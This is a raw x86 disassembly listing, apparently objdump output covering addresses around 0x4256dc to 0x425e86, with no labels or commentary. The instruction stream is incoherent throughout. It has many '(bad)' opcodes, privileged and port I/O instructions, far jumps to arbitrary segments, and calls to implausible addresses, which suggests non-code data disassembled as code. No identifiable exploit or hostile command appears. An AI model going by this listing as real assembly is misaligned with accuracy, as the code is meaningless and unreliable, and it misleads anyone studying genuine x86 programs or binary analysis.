  4256dc:	cmp    DWORD PTR [edi+eax*4-0x2d],0xb939520
  4256e4:	inc    ebx
  4256e5:	adc    DWORD PTR [ebp+0x7b],0xffffffa0
  4256e9:	fiadd  WORD PTR [edx-0xfe697e7]
  4256ef:	xor    eax,0x9ab06459
  4256f4:	or     BYTE PTR [eax-0x22652b21],ah
  4256fa:	and    al,0x43
  4256fc:	push   ecx
  4256fd:	xchg   esp,eax
  4256fe:	push   ss
  4256ff:	xor    al,cl
  425701:	and    ebp,DWORD PTR [ecx+ebp*1+0x7961ea20]
  425708:	test   ch,dh
  42570a:	push   ebp
  42570b:	scas   eax,DWORD PTR es:[edi]
  42570c:	xchg   esp,eax
  42570d:	pusha  
  42570e:	and    dl,BYTE PTR [edx]
  425710:	and    DWORD PTR [esi],ebp
  425712:	push   0xdfd9d5f8
  425717:	xchg   esi,eax
  425718:	inc    edx
  425719:	in     al,dx
  42571a:	xor    eax,0x68e0e38f
  42571f:	add    BYTE PTR [ecx+0x2b],bh
  425722:	ss jg  0x425750
  425725:	mov    ch,0x40
  425727:	xor    edx,esi
  425729:	shl    BYTE PTR [ecx],cl
  42572b:	mov    al,0x7f
  42572d:	sbb    BYTE PTR [edi+0x1c024346],0xf1
  425734:	cmp    eax,DWORD PTR [ebp-0x1e]
  425737:	hlt    
  425738:	xor    esp,0x107902e
  42573e:	not    BYTE PTR [ebx+0x35c588cf]
  425744:	add    edx,ebp
  425746:	push   ebx
  425747:	jae    0x4256cb
  425749:	(bad)  
  42574a:	mov    ebp,0xc3e78684
  42574f:	dec    eax
  425750:	add    BYTE PTR [ecx],dl
  425752:	and    dl,bl
  425754:	mov    ebx,DWORD PTR [eax]
  425756:	test   al,0x8d
  425758:	das    
  425759:	arpl   di,bx
  42575b:	mov    al,0xf5
  42575d:	dec    ebx
  42575e:	add    ebp,ebp
  425760:	add    eax,0xff514cc9
  425765:	pop    es
  425766:	test   BYTE PTR cs:[ecx+0x6b],dh
  42576a:	push   edx
  42576b:	(bad)  
  42576c:	jns    0x425774
  42576e:	dec    ecx
  42576f:	inc    edi
  425770:	sub    al,0x69
  425772:	call   0xbce7ed1c
  425777:	sub    al,0xd5
  425779:	test   esi,edi
  42577b:	mov    bl,0x90
  42577d:	add    al,0xe6
  42577f:	fisub  WORD PTR [eax+0x1145a572]
  425785:	cmp    eax,0x6d76c6ee
  42578a:	inc    ebp
  42578b:	js     0x4257ba
  42578d:	push   edx
  42578e:	aam    0xd0
  425790:	lahf   
  425791:	cmp    ebp,DWORD PTR [ebx+0x50ba2976]
  425797:	xchg   ebp,eax
  425798:	xchg   esp,eax
  425799:	sub    bl,BYTE PTR [eax+0x56]
  42579c:	xor    al,0x8c
  42579e:	push   ss
  42579f:	(bad)  
  4257a0:	int3   
  4257a1:	iret   
  4257a2:	aad    0x13
  4257a4:	scas   eax,DWORD PTR es:[edi]
  4257a5:	lods   eax,DWORD PTR ds:[esi]
  4257a6:	xlat   BYTE PTR ds:[ebx]
  4257a7:	pop    eax
  4257a8:	xchg   edx,eax
  4257a9:	mov    cl,0x7f
  4257ab:	sahf   
  4257ac:	sub    ch,al
  4257ae:	adc    al,BYTE PTR [ebp+0x3f]
  4257b1:	push   esp
  4257b2:	cmp    DWORD PTR [edi+0x15],ebp
  4257b5:	xchg   esi,eax
  4257b6:	gs mov ebx,?
  4257b9:	inc    esp
  4257ba:	add    bl,BYTE PTR [edx-0x32]
  4257bd:	xor    BYTE PTR [esi-0xafb5df4],dh
  4257c3:	mov    edi,0x1abda2c
  4257c8:	mov    cl,0x12
  4257ca:	and    edi,edx
  4257cc:	add    BYTE PTR ds:0x76e62831,bh
  4257d2:	pop    ecx
  4257d3:	cmp    al,0x1b
  4257d5:	dec    eax
  4257d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4257d7:	xchg   ebp,eax
  4257d8:	xchg   esi,eax
  4257d9:	xchg   DWORD PTR [edx+0x5],eax
  4257dc:	arpl   WORD PTR [edx+0x7c],cx
  4257df:	cmp    BYTE PTR [ecx+0xcafea2],bh
  4257e5:	js     0x4257c3
  4257e7:	cmp    DWORD PTR [ebx-0xc],0x31efa711
  4257ee:	icebp  
  4257ef:	ds scas al,BYTE PTR es:[edi]
  4257f1:	rol    BYTE PTR [eax-0x17],cl
  4257f4:	retf   0x68e4
  4257f7:	xchg   esp,eax
  4257f8:	mov    bl,0x7a
  4257fa:	popf   
  4257fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257fc:	in     al,dx
  4257fd:	(bad)  [ebx]
  4257ff:	push   ss
  425800:	adc    DWORD PTR [edi-0x1a],ebp
  425803:	dec    ebp
  425804:	dec    ebx
  425805:	aad    0x36
  425807:	stos   DWORD PTR es:[di],eax
  425809:	jl     0x425802
  42580b:	pop    esp
  42580c:	nop
  42580d:	test   BYTE PTR [edx+0x2d],dh
  425810:	sub    al,BYTE PTR ds:0xa5208ecb
  425816:	inc    esp
  425817:	or     al,0x4c
  425819:	les    eax,FWORD PTR ds:0x2de2f300
  42581f:	clc    
  425820:	fldcw  WORD PTR [edx-0x8]
  425823:	(bad)  
  425824:	jae    0x425860
  425826:	xchg   DWORD PTR [eax-0x21111b03],ebx
  42582c:	mov    ch,0x5e
  42582e:	jmp    0x943cb042
  425833:	mov    dh,0x16
  425835:	xor    al,0xe2
  425837:	rcr    BYTE PTR [ebp-0x51],1
  42583a:	pop    ecx
  42583b:	or     BYTE PTR [ecx+eiz*4+0x6bd5468f],0x1c
  425843:	out    dx,al
  425844:	pop    ss
  425845:	outs   dx,BYTE PTR ds:[esi]
  425846:	or     bh,dl
  425848:	cli    
  425849:	les    ebp,FWORD PTR ds:[edx+0x681f9ce]
  425850:	loop   0x4258b8
  425852:	das    
  425853:	add    DWORD PTR [eax],ecx
  425855:	add    al,0x19
  425857:	or     BYTE PTR [ebp+0x1eb105a1],dl
  42585d:	cmp    ebp,eax
  42585f:	gs jb  0x4258c6
  425862:	and    edx,DWORD PTR [ebp+0xd]
  425865:	sub    edx,edx
  425867:	mov    esi,0xf731021c
  42586c:	pop    ecx
  42586d:	outs   dx,DWORD PTR ds:[esi]
  42586e:	or     cl,cl
  425870:	sub    ch,BYTE PTR [ebp+0x4f505f5f]
  425876:	js     0x42582c
  425878:	test   eax,0x1b0434e
  42587d:	in     eax,0x74
  42587f:	inc    ebp
  425880:	sahf   
  425881:	mov    ch,0x95
  425883:	pop    esi
  425884:	scas   eax,DWORD PTR es:[edi]
  425885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425886:	mov    cl,BYTE PTR [edx-0x2107ed0e]
  42588c:	enter  0x3dbc,0x1
  425890:	imul   ecx,DWORD PTR [edi+0xdc3a361],0x758ce908
  42589a:	pop    ds
  42589b:	dec    esi
  42589c:	dec    edx
  42589d:	mov    cl,0x67
  42589f:	jns    0x4258ce
  4258a1:	imul   edi,DWORD PTR [eax],0x6a
  4258a4:	sub    eax,0x4182fab5
  4258a9:	sub    bl,BYTE PTR [edx]
  4258ab:	pop    esi
  4258ac:	in     al,0xcb
  4258ae:	fs std 
  4258b0:	jae    0x4258aa
  4258b2:	pop    ecx
  4258b3:	lea    esi,[ebp+0x42]
  4258b6:	sbb    eax,0x2eb4c76d
  4258bb:	fsubr  QWORD PTR [esi]
  4258bd:	mov    ah,0xc2
  4258bf:	test   DWORD PTR [ebp+0x7d],eax
  4258c2:	inc    ecx
  4258c3:	das    
  4258c4:	mov    edx,0x434beb18
  4258c9:	sbb    BYTE PTR [ebx-0x5e],0x96
  4258cd:	popa   
  4258ce:	xchg   esi,eax
  4258cf:	add    DWORD PTR [edx+0x2],edx
  4258d2:	push   0xb
  4258d4:	not    DWORD PTR [ecx-0x14]
  4258d7:	aad    0xd4
  4258d9:	(bad)  [edi+0x12]
  4258dc:	mov    bh,bh
  4258de:	adc    al,0xc1
  4258e0:	sbb    ecx,ecx
  4258e2:	xor    eax,edx
  4258e4:	enter  0x6a6e,0x75
  4258e8:	push   ss
  4258e9:	pop    eax
  4258ea:	out    0xb9,al
  4258ec:	inc    ebp
  4258ed:	add    ebx,DWORD PTR [ecx+0x56]
  4258f0:	mov    ah,0xcf
  4258f2:	shr    BYTE PTR [ebx-0x36aceccc],cl
  4258f8:	mov    bh,0x5b
  4258fa:	sbb    edi,DWORD PTR [ecx]
  4258fc:	hlt    
  4258fd:	pop    ebp
  4258fe:	popf   
  4258ff:	mov    eax,ds:0x5f6b44dd
  425904:	scas   eax,DWORD PTR es:[edi]
  425905:	sti    
  425906:	xor    eax,DWORD PTR [eax+0x5a110cd0]
  42590c:	mov    ebp,0x4ea7a107
  425911:	push   es
  425912:	and    eax,0x958a65d4
  425917:	data16 loop 0x425960
  42591a:	mov    dh,BYTE PTR [edi]
  42591c:	dec    edi
  42591d:	popf   
  42591e:	xor    BYTE PTR gs:[esi-0x45c7653c],cl
  425925:	das    
  425926:	call   DWORD PTR [eax-0x7ece3f77]
  42592c:	mov    gs,WORD PTR gs:[esi-0x405de2e4]
  425933:	or     bl,cl
  425935:	inc    esp
  425936:	xor    ah,dh
	...
  425940:	add    ah,ch
  425942:	test   BYTE PTR [eax-0x5f],ah
  425945:	push   0xedcdede5
  42594a:	cld    
  42594b:	mov    BYTE PTR [ebx+0x3a3f540e],ah
  425951:	in     al,0xd0
  425953:	add    DWORD PTR [eax],eax
  425955:	scas   eax,DWORD PTR es:[edi]
  425956:	add    eax,DWORD PTR [eax]
  425958:	add    BYTE PTR [eax+0x15],cl
  42595b:	dec    edi
  42595c:	and    ebp,ebp
  42595e:	xor    BYTE PTR [ebx+0x17],dl
  425961:	hlt    
  425962:	popa   
  425963:	fidivr DWORD PTR [esi+0x108fbf14]
  425969:	call   0x6dfb564d
  42596e:	icebp  
  42596f:	aaa    
  425970:	je     0x4259de
  425972:	mov    eax,ds:0x61da5ac4
  425977:	out    0x4a,eax
  425979:	lds    ebp,FWORD PTR [edi+0x2a2e8af0]
  42597f:	mov    ch,ch
  425981:	es sbb eax,0xce25966a
  425987:	cmp    al,0x26
  425989:	js     0x4259f8
  42598b:	jo     0x425940
  42598d:	push   ecx
  42598e:	dec    edx
  42598f:	pop    edx
  425990:	lods   eax,DWORD PTR ds:[esi]
  425991:	mov    al,ds:0x8b79ee27
  425996:	pop    edi
  425997:	push   si
  425999:	(bad)  
  42599a:	nop
  42599b:	and    esi,ebx
  42599d:	sti    
  42599e:	into   
  42599f:	in     eax,dx
  4259a0:	mov    al,BYTE PTR [eax]
  4259a2:	mov    dl,0xb2
  4259a4:	fwait
  4259a5:	xchg   DWORD PTR [ebx+0x7a],ebp
  4259a8:	ds adc ah,cl
  4259ab:	pop    ecx
  4259ac:	cmp    edi,ebp
  4259ae:	js     0x425a23
  4259b0:	dec    edx
  4259b1:	mov    ds:0x88104cdb,al
  4259b6:	clc    
  4259b7:	aad    0x34
  4259b9:	test   DWORD PTR [ecx-0x77],0xaa344518
  4259c0:	pop    ebp
  4259c1:	outs   dx,DWORD PTR ds:[esi]
  4259c2:	repz mov esi,0xa7d58655
  4259c8:	(bad)  
  4259c9:	(bad)  
  4259cb:	mov    dl,0xcb
  4259cd:	dec    edx
  4259ce:	sbb    ebp,esi
  4259d0:	mov    al,BYTE PTR [esi+0x38340fbe]
  4259d6:	mov    bl,0x3
  4259d8:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259da:	pusha  
  4259db:	ds sahf 
  4259dd:	xchg   edi,eax
  4259de:	imul   eax,DWORD PTR [eax-0x16a17090],0x29ef8f65
  4259e8:	je     0x4259be
  4259ea:	jge    0x425a35
  4259ec:	and    eax,0xac9c976
  4259f1:	aam    0xba
  4259f3:	pop    ds
  4259f4:	jbe    0x4259bb
  4259f6:	sbb    DWORD PTR [ebx-0x5b73b0b6],ebp
  4259fc:	imul   ecx,DWORD PTR [edi+0x211360bf],0x3a
  425a03:	xchg   edx,eax
  425a04:	cs icebp 
  425a06:	jae    0x425a31
  425a08:	mov    esi,0xc61951b4
  425a0d:	(bad)  
  425a0e:	mov    bh,0x87
  425a10:	enter  0x75af,0xe1
  425a14:	jo     0x425a10
  425a16:	mov    ebx,0x6767aea
  425a1b:	jb     0x425a1e
  425a1d:	leave  
  425a1e:	cdq    
  425a1f:	je     0x425a4d
  425a21:	pop    es
  425a22:	push   ebx
  425a23:	neg    DWORD PTR [edi-0x5877b4da]
  425a29:	fcmovu st,st(6)
  425a2b:	mov    eax,ds:0x333ec50d
  425a30:	shl    DWORD PTR [eax-0x71],0x8d
  425a34:	or     esi,DWORD PTR [ebx]
  425a36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a37:	sub    BYTE PTR [esi],ah
  425a39:	in     al,0x79
  425a3b:	mov    edi,0x897f487e
  425a40:	add    al,0xf2
  425a42:	xor    DWORD PTR [ecx+0x148429b5],esi
  425a48:	xchg   ebx,eax
  425a49:	mov    esp,DWORD PTR [ebx-0x522f39d1]
  425a4f:	and    eax,0xf684cd95
  425a54:	cmp    eax,0x76a9b4b7
  425a59:	gs dec ebp
  425a5b:	pop    edx
  425a5c:	jbe    0x4259e0
  425a5e:	bnd ret 
  425a60:	sar    DWORD PTR [ebx+0x54dfe120],1
  425a66:	pop    esi
  425a67:	cmp    BYTE PTR [ebx+ebp*8-0x1a],ah
  425a6b:	retf   
  425a6c:	push   es
  425a6d:	les    edi,FWORD PTR [ecx]
  425a6f:	or     DWORD PTR [ecx],ebp
  425a71:	dec    edi
  425a72:	adc    al,0x83
  425a74:	xchg   edx,eax
  425a75:	sbb    eax,DWORD PTR [esi+0x71]
  425a78:	outs   dx,DWORD PTR ds:[esi]
  425a79:	and    al,0x76
  425a7b:	dec    esi
  425a7c:	into   
  425a7d:	dec    edx
  425a7e:	neg    BYTE PTR [edx+0x39350d88]
  425a84:	sub    dh,BYTE PTR [edx+0x45e9f0f3]
  425a8a:	xor    ch,dl
  425a8c:	scas   eax,DWORD PTR es:[edi]
  425a8d:	lock cmc 
  425a8f:	and    DWORD PTR [ebx],ebx
  425a91:	dec    esp
  425a92:	fucomi st,st(4)
  425a94:	stc    
  425a95:	es into 
  425a97:	xor    DWORD PTR [ebx+0xe],eax
  425a9a:	xor    al,0x23
  425a9c:	inc    esi
  425a9d:	xchg   ebx,eax
  425a9e:	inc    edi
  425a9f:	inc    ebx
  425aa0:	pop    ds
  425aa1:	inc    esi
  425aa2:	clc    
  425aa3:	pop    ds
  425aa4:	mov    edi,DWORD PTR [eax+0x19f6952]
  425aaa:	sub    al,0xbe
  425aac:	adc    DWORD PTR ds:0x58865697,ecx
  425ab2:	dec    eax
  425ab3:	retf   
  425ab4:	mov    BYTE PTR [edi],bl
  425ab6:	clc    
  425ab7:	or     BYTE PTR [edx-0x5efd7456],ch
  425abd:	xor    al,0x6b
  425abf:	mov    edi,0x5914304f
  425ac4:	mov    bl,0x5c
  425ac6:	push   ebx
  425ac7:	mov    WORD PTR [eax],?
  425ac9:	ins    DWORD PTR es:[edi],dx
  425aca:	in     eax,0x46
  425acc:	dec    esp
  425acd:	xlat   BYTE PTR ds:[ebx]
  425ace:	ret    0x88c5
  425ad1:	pop    ss
  425ad2:	mov    gs,WORD PTR [esi]
  425ad4:	inc    ebx
  425ad5:	or     edx,DWORD PTR [ecx-0x602c6c8a]
  425adb:	mov    eax,ds:0xfbb162b5
  425ae0:	pop    es
  425ae1:	mov    ecx,0xab85710c
  425ae6:	or     ecx,edx
  425ae8:	repnz mov es:0xe7ddd98d,al
  425aef:	(bad)  
  425af0:	pop    edx
  425af1:	jg     0x425aac
  425af3:	imul   ebp,DWORD PTR [edi],0x9a0283a1
  425af9:	adc    ah,BYTE PTR [ecx]
  425afb:	sub    DWORD PTR [esp+edi*1],edx
  425afe:	clc    
  425aff:	ret    0xae2f
  425b02:	js     0x425b26
  425b04:	jp     0x425b4a
  425b06:	int    0x62
  425b08:	jg     0x425b52
  425b0a:	inc    esi
  425b0b:	sbb    esi,ecx
  425b0d:	lods   eax,DWORD PTR ds:[esi]
  425b0e:	push   ebx
  425b0f:	and    bh,bh
  425b11:	jmp    0x30a3:0x15281944
  425b18:	add    eax,0xce500049
  425b1d:	cmp    eax,0x2faf8082
  425b22:	popa   
  425b23:	sahf   
  425b24:	bound  esp,QWORD PTR [ebp+0x52606a9f]
  425b2a:	adc    al,0xe5
  425b2c:	or     dh,BYTE PTR [edx]
  425b2e:	jge    0x425b36
  425b30:	dec    edx
  425b31:	into   
  425b32:	xor    DWORD PTR ds:0xdf390b6d,edx
  425b38:	loopne 0x425b39
  425b3a:	ss dec ebx
  425b3c:	int3   
  425b3d:	fwait
  425b3e:	(bad)
  425b42:	dec    eax
  425b43:	test   al,0x53
  425b45:	test   BYTE PTR [ecx+edx*1],dh
  425b48:	das    
  425b49:	(bad)  
  425b4a:	in     eax,0x43
  425b4c:	sub    al,0x8b
  425b4e:	xor    edx,eax
  425b50:	std    
  425b51:	ror    BYTE PTR [eax+edi*2+0x67],cl
  425b55:	sbb    al,0xf4
  425b57:	sti    
  425b58:	mov    ah,0xf4
  425b5a:	xor    bh,0x46
  425b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b5e:	inc    ecx
  425b5f:	ja     0x425ae3
  425b61:	lods   eax,DWORD PTR ds:[esi]
  425b62:	or     DWORD PTR [ebp-0x1df0003d],eax
  425b68:	jbe    0x425be7
  425b6a:	xor    DWORD PTR [eax],esi
  425b6c:	shl    BYTE PTR [edi+ecx*2+0x22],cl
  425b70:	mov    ch,0xa1
  425b72:	mov    WORD PTR [ebp-0x5a],fs
  425b75:	cld    
  425b76:	inc    edx
  425b77:	enter  0x204b,0x47
  425b7b:	inc    eax
  425b7c:	ins    DWORD PTR es:[edi],dx
  425b7d:	dec    eax
  425b7e:	xor    dl,BYTE PTR [edx-0x291f9515]
  425b84:	bound  ebx,QWORD PTR [eax-0x18ba220a]
  425b8a:	clc    
  425b8b:	sbb    cl,ch
  425b8d:	add    esi,edx
  425b8f:	test   eax,0x2e865af4
  425b94:	cli    
  425b95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b96:	js     0x425b2b
  425b98:	cdq    
  425b99:	cli    
  425b9a:	dec    DWORD PTR [ebp-0x7c026f6e]
  425ba0:	outs   dx,BYTE PTR ds:[esi]
  425ba1:	or     cl,al
  425ba3:	sub    dh,dl
  425ba5:	add    al,0xf2
  425ba7:	pop    ss
  425ba8:	mov    bl,0x19
  425baa:	into   
  425bab:	fdiv   QWORD PTR [esp+ecx*4+0x66]
  425baf:	daa    
  425bb0:	mov    BYTE PTR [edi-0x3f64f2c9],dl
  425bb6:	rcl    BYTE PTR [eax-0x52],cl
  425bb9:	into   
  425bba:	xor    BYTE PTR [ecx],dh
  425bbc:	cmp    dh,BYTE PTR [edi+0x21a96114]
  425bc2:	push   ds
  425bc3:	push   0x5e84bf3c
  425bc8:	ds jnp 0x425c1d
  425bcb:	(bad)  
  425bcc:	fnstenv [ebx+ebx*4]
  425bcf:	jo     0x425b6d
  425bd1:	sahf   
  425bd2:	inc    edi
  425bd3:	sub    eax,0x5eb905ef
  425bd8:	pusha  
  425bd9:	mov    esp,DWORD PTR [esi+edi*2]
  425bdc:	inc    edx
  425bdd:	sub    esp,ecx
  425bdf:	or     al,0xbe
  425be1:	enter  0x65a2,0xa4
  425be5:	call   0x7203:0x49ac8772
  425bec:	fwait
  425bed:	adc    al,0x9c
  425bef:	aaa    
  425bf0:	pop    ds
  425bf1:	mov    esp,0x17a8c2d
  425bf6:	mov    esi,0x5ffe7071
  425bfb:	jmp    0xed52:0x603dc5ac
  425c02:	inc    edx
  425c03:	xchg   ecx,eax
  425c04:	adc    al,0xf1
  425c06:	mov    esp,0x951e24be
  425c0b:	aas    
  425c0c:	js     0x425c0f
  425c0e:	mov    edx,0xb17b0272
  425c13:	xchg   ecx,eax
  425c14:	mov    cl,0xb3
  425c16:	adc    eax,0x4b9ffb1e
  425c1b:	push   esi
  425c1c:	out    0x31,eax
  425c1e:	push   ds
  425c1f:	mov    BYTE PTR [ebx+0x74205021],ch
  425c25:	jnp    0x425c3c
  425c27:	fnsave [ecx]
  425c29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c2a:	push   ecx
  425c2b:	fisttp WORD PTR [edi-0x3f]
  425c2e:	pop    esi
  425c2f:	fsubr  QWORD PTR [esi-0x9fa4a6c]
  425c35:	adc    DWORD PTR [esi],esi
  425c37:	out    0xee,al
  425c39:	(bad)  
  425c3a:	pushf  
  425c3b:	push   ds
  425c3c:	mov    ebx,0xbb5169dc
  425c41:	adc    eax,esp
  425c43:	ds in  al,dx
  425c45:	cmp    eax,0xb39758e4
  425c4a:	outs   dx,BYTE PTR ds:[esi]
  425c4b:	inc    ebp
  425c4c:	pop    esp
  425c4d:	jp     0x425cc1
  425c4f:	in     eax,0xa0
  425c51:	jecxz  0x425c1c
  425c53:	int3   
  425c54:	call   0x78540a3b
  425c59:	sub    BYTE PTR [edx],cl
  425c5b:	push   esi
  425c5c:	xchg   ebx,eax
  425c5d:	inc    ebp
  425c5e:	sub    cl,BYTE PTR [edx]
  425c60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c61:	arpl   di,bp
  425c63:	ins    BYTE PTR es:[edi],dx
  425c64:	stos   DWORD PTR es:[edi],eax
  425c65:	xchg   edi,eax
  425c66:	inc    ebx
  425c67:	mov    ah,0x9b
  425c69:	shr    DWORD PTR [ebx+0x45],cl
  425c6c:	sub    cl,BYTE PTR [ebx-0x5d]
  425c6f:	lds    ebp,FWORD PTR [edi]
  425c71:	add    eax,DWORD PTR [ecx]
  425c73:	ret    0xaf89
  425c76:	stc    
  425c77:	(bad)  ds:[edx+0x150cf19e]
  425c7e:	push   edi
  425c7f:	mov    edi,0x600fdcb5
  425c84:	pop    ss
  425c85:	sub    al,0xfb
  425c87:	xchg   edi,eax
  425c88:	hlt    
  425c89:	sbb    al,0x26
  425c8b:	add    esp,ebx
  425c8d:	mov    ecx,0xdcc7064d
  425c92:	push   esi
  425c93:	bound  ecx,QWORD PTR [ebp-0x63]
  425c96:	dec    edx
  425c97:	add    al,0xb1
  425c99:	imul   edx,ecx,0xffffff8f
  425c9c:	jmp    0x330c:0x4ee62df8
  425ca3:	out    dx,eax
  425ca4:	dec    eax
  425ca5:	ret    0x42fa
  425ca8:	dec    ebp
  425ca9:	push   esp
  425caa:	into   
  425cab:	bound  ebx,QWORD PTR [edx]
  425cad:	test   BYTE PTR [ebp+0x366732fb],bl
  425cb3:	mov    ebp,0x23eed879
  425cb8:	addr16 and al,0xe6
  425cbb:	ins    DWORD PTR es:[edi],dx
  425cbc:	in     al,0x70
  425cbe:	jle    0x425cf5
  425cc0:	imul   esi,edx,0xffffff86
  425cc3:	mov    cl,0x76
  425cc5:	xchg   cl,bl
  425cc7:	cmp    al,0xc6
  425cc9:	adc    ebp,DWORD PTR [esi+0x4c]
  425ccc:	pop    es
  425ccd:	pop    ss
  425cce:	test   BYTE PTR [edi+eiz*2],al
  425cd1:	shl    dh,1
  425cd3:	aas    
  425cd4:	mov    esi,DWORD PTR [esi+0xe]
  425cd7:	ret    
  425cd8:	mov    dh,0x26
  425cda:	mov    dh,BYTE PTR [edx+ebp*2]
  425cdd:	int    0xc1
  425cdf:	push   cs
  425ce0:	and    ch,BYTE PTR [ecx+0x5f]
  425ce3:	dec    edx
  425ce4:	jmp    0xc861:0xb238dc39
  425ceb:	hlt    
  425cec:	imul   ebx,DWORD PTR [esi],0x10c8f190
  425cf2:	lods   eax,DWORD PTR ds:[esi]
  425cf3:	lods   al,BYTE PTR ds:[esi]
  425cf4:	mov    ch,0x37
  425cf6:	psubb  mm3,QWORD PTR [edx+0x49]
  425cfa:	stos   DWORD PTR es:[edi],eax
  425cfb:	and    DWORD PTR [esi-0x5c5eb33b],0x5b
  425d02:	mov    esp,0xc765c3ea
  425d07:	cmp    BYTE PTR [eax],al
	...
  425d11:	pop    edx
  425d12:	push   ecx
  425d13:	leave  
  425d14:	popf   
  425d15:	retf   
  425d16:	popf   
  425d17:	pop    esi
  425d18:	xlat   BYTE PTR ds:[ebx]
  425d19:	loope  0x425d6f
  425d1b:	fs lock push ebp
  425d1e:	stos   BYTE PTR es:[edi],al
  425d1f:	daa    
  425d20:	(bad)  
  425d21:	xchg   ebx,eax
  425d22:	aam    0x1
  425d24:	add    BYTE PTR [edi+0x2b000003],ch
  425d2a:	xlat   BYTE PTR ds:[ebx]
  425d2b:	xchg   ecx,eax
  425d2c:	sti    
  425d2d:	push   ebx
  425d2e:	das    
  425d2f:	fld    DWORD PTR [eax+ebp*4+0x245bfc39]
  425d36:	(bad)  
  425d37:	cmc    
  425d38:	int    0xb7
  425d3a:	test   BYTE PTR [ebx-0x73],ch
  425d3d:	and    BYTE PTR [edx],0x39
  425d40:	retf   
  425d41:	mov    dh,0xec
  425d43:	adc    eax,0xafd70c85
  425d48:	push   edx
  425d49:	adc    dl,BYTE PTR [eiz*1+0x133b8696]
  425d50:	test   BYTE PTR [ebx],dl
  425d52:	or     DWORD PTR [edi+edi*1+0x7b],eax
  425d56:	cmp    esp,DWORD PTR [ebx+0x54]
  425d59:	jo     0x425dc7
  425d5b:	mov    eax,ds:0xbd65bb54
  425d60:	stos   BYTE PTR es:[edi],al
  425d61:	stc    
  425d62:	retf   
  425d63:	(bad)  
  425d64:	dec    esi
  425d65:	mov    ds:0x2cf4819f,eax
  425d6a:	clc    
  425d6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d6c:	inc    ebp
  425d6d:	push   0x5a
  425d6f:	add    DWORD PTR [ecx+0x4be5348b],ebx
  425d75:	dec    ebp
  425d76:	mov    esp,0xea32caf1
  425d7b:	cdq    
  425d7c:	loope  0x425d45
  425d7e:	xchg   edx,eax
  425d7f:	je     0x425df5
  425d81:	nop
  425d82:	sbb    eax,0x64fe1301
  425d87:	inc    ebx
  425d88:	test   al,0x7d
  425d8a:	in     al,0xac
  425d8c:	cdq    
  425d8d:	push   ebx
  425d8e:	int3   
  425d8f:	stos   BYTE PTR es:[edi],al
  425d90:	sbb    ecx,edi
  425d92:	aaa    
  425d93:	mov    ds:0xd7b2b40f,al
  425d98:	xchg   BYTE PTR [edi+0xde8ced4],cl
  425d9e:	inc    esp
  425d9f:	adc    al,0x6a
  425da1:	repz dec esi
  425da3:	dec    eax
  425da4:	and    BYTE PTR cs:[ebx-0x420ec265],0xd
  425dac:	xchg   ebp,eax
  425dad:	or     BYTE PTR [eax+0xb],cl
  425db0:	nop
  425db1:	mov    eax,0x53b6623d
  425db6:	inc    esi
  425db7:	and    eax,0x5d9aef45
  425dbc:	rcr    edx,cl
  425dbe:	jl     0x425d53
  425dc0:	cld    
  425dc1:	jg     0x425e00
  425dc3:	int    0x88
  425dc5:	ds adc eax,esp
  425dc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425dc9:	fisttp WORD PTR [edx+0x70]
  425dcc:	jg     0x425df3
  425dce:	into   
  425dcf:	push   0x359c65a3
  425dd4:	jmp    0x425d94
  425dd6:	dec    edi
  425dd7:	adc    BYTE PTR [edx-0x47eb8afd],bl
  425ddd:	add    BYTE PTR [esi+0x7d],bl
  425de0:	push   ebp
  425de1:	imul   edi,eax,0x5c
  425de4:	push   edi
  425de5:	test   ah,al
  425de7:	shr    DWORD PTR [edi-0x3e47650e],1
  425ded:	inc    eax
  425dee:	jns    0x425dd4
  425df0:	iret   
  425df1:	sbb    BYTE PTR [edx+0x48bb1a4d],0x57
  425df8:	sbb    ecx,edi
  425dfa:	jg     0x425dd3
  425dfc:	sbb    ecx,ebp
  425dfe:	fdiv   DWORD PTR [ebx-0x5e13e254]
  425e04:	sbb    dl,cl
  425e06:	mov    esi,0xee6d159e
  425e0b:	jp     0x425d8f
  425e0d:	jecxz  0x425e22
  425e0f:	sub    DWORD PTR [eax],edi
  425e11:	mov    eax,0xf924ca41
  425e16:	adc    al,0x5a
  425e18:	int    0xfb
  425e1a:	cwde   
  425e1b:	xchg   ebx,eax
  425e1c:	push   ecx
  425e1d:	dec    edx
  425e1e:	enter  0x464b,0xb6
  425e22:	sub    edi,esi
  425e24:	(bad)  
  425e25:	push   esp
  425e26:	aaa    
  425e27:	shl    BYTE PTR [esp+edx*4-0x73],cl
  425e2b:	jmp    0x96c6:0x252d2ca2
  425e32:	or     DWORD PTR [ebx+edi*2],esi
  425e35:	add    eax,0x386c5e6d
  425e3a:	pop    ss
  425e3b:	push   0xe2ce1662
  425e40:	xchg   ebp,eax
  425e41:	pop    edx
  425e42:	jbe    0x425dc5
  425e44:	jno    0x425df7
  425e46:	jns    0x425df4
  425e48:	mov    eax,0x7cc505bc
  425e4d:	sbb    dh,BYTE PTR [edx]
  425e4f:	std    
  425e50:	dec    ebx
  425e51:	jl     0x425e57
  425e53:	pop    eax
  425e54:	icebp  
  425e55:	call   0x498b0f71
  425e5a:	cmp    DWORD PTR [edi+ebp*1],ebx
  425e5d:	mov    ds:0x864fab1a,al
  425e62:	inc    esp
  425e63:	add    ch,BYTE PTR [esi+0x15]
  425e66:	mov    dh,0x75
  425e68:	pop    es
  425e69:	popa   
  425e6a:	das    
  425e6b:	push   ecx
  425e6c:	sahf   
  425e6d:	out    0x44,al
  425e6f:	hlt    
  425e70:	push   ebx
  425e71:	push   0x2d
  425e73:	sbb    esi,DWORD PTR [edi-0x3463ca6c]
  425e79:	mov    bh,0x61
  425e7b:	jbe    0x425eb1
  425e7d:	in     eax,0x97
  425e7f:	sub    edx,DWORD PTR [ebp+0x4d]
  425e82:	xchg   edi,eax
  425e83:	inc    edi
  425e84:	lds    ebx,FWORD PTR [ebx]
  425e86:	cli    
